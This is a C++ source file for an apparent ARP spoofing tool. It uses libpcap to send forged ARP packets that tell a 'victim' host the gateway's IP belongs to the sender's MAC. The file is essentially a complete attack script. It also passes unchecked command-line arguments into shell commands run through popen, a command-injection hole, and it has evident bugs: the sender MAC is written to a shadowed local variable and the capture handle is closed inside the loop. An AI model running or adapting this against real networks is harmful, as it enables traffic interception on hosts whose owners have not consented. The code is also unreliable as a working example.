#include <cstdio>
#include <pcap.h>
#include "ethhdr.h"
#include "arphdr.h"
#include <iostream>
#include <fstream>
#include <sstream>
#include <algorithm>
#include <cstdio>
#include <cstring>
#include <stdio.h>
#include <array>
#include <glog/logging.h>

using namespace std;

#pragma pack(push, 1)
struct EthArpPacket final {
    EthHdr eth_;
    ArpHdr arp_;
};
#pragma pack(pop)


string cmd(string command) {
    std::string result;
    char buffer[128];

    FILE* pipe = popen(command.c_str(), "r");

    if (!pipe) {
        return "Error: popen failed!";
    }

    while (!feof(pipe)) {
        if (fgets(buffer, 128, pipe) != nullptr) {
            result += buffer;
        }
    }

    pclose(pipe);

    if (!result.empty() && result.back() == '\n') {
        result.pop_back();
    }

    return result;
}

using MAC = uint8_t[6];
//using MAC = std::array<uint8_t, 6>;
void macFstr(string strMac, MAC &mac){
    //MAC mac;
    std::istringstream iss(strMac);
    iss >> std::hex;
     for (int i = 0; i < 6; ++i) {
        unsigned int val;
        char tmp;
        iss >> val;
        if (i < 5) {
            iss >> tmp;
        }
        mac[i] = static_cast<uint8_t>(val);
    }
    //return mac;
}


void getMymac(string inter, MAC &mac) {
    string command = "ifconfig " + inter;
    string output = cmd(command);
    istringstream iss(output);

    string line;

    while (getline(iss, line)) {
        auto pos = line.find("ether ");
        if (pos != string::npos) {
            MAC mac;
            string macT = line.substr(pos + 6, 17);
            macFstr(macT, mac);
            //return macFstr(mac);
        }

    }
    //return "";
}

void getVmac(string vip, MAC &mac) {
    //MAC mac;
    string command = "arp -n " + vip + " | awk '/" + vip + "/ {print $3}' ";
    string output = cmd(command);
    //mac=macFstr(output);    
    macFstr(output, mac);
    //return mac;
}



int main(int argc, char* argv[]) {
    google::InitGoogleLogging(argv[0]);
    //FLAGS_log_dir="logs";//LOG(INFO) << "hello world";

    if (argc < 4) {

        //string str=getMymac("eth0");
        //cout << str <<endl;
        cout<<"why?"<<endl;
	    return 0;
    }

    char* dev = argv[1];
    char errbuf[PCAP_ERRBUF_SIZE];   
    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);

    if (handle == nullptr) {
        fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
        return -1;
    }
    MAC mymac;
    getMymac(argv[1], mymac);


    for (int i = 2; i < argc; i=i+2) {
        EthArpPacket packet;

	string arpUp = "sudo arping -c 5 " + (string)argv[i];
        cmd(arpUp);

        MAC vmac;
        getVmac(argv[i], vmac); //victim mac

        packet.eth_.dmac_ = vmac;//Mac(vmac);
        packet.eth_.smac_ = mymac;//Mac(mymac);
        packet.eth_.type_ = htons(EthHdr::Arp);

        packet.arp_.hrd_ = htons(ArpHdr::ETHER);
        packet.arp_.pro_ = htons(EthHdr::Ip4);
        packet.arp_.hln_ = Mac::SIZE;
        packet.arp_.pln_ = Ip::SIZE;
        packet.arp_.op_ = htons(ArpHdr::Request);
        packet.arp_.smac_ = mymac;//Mac(mymac);
        packet.arp_.sip_ = htonl(Ip(argv[i+1])); //gateway ip
        packet.arp_.tmac_ = vmac;//Mac(vmac);
        packet.arp_.tip_ = htonl(Ip(argv[i])); //victim ip

        int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
        if (res != 0) {
            fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
        }

        pcap_close(handle);
    }

}

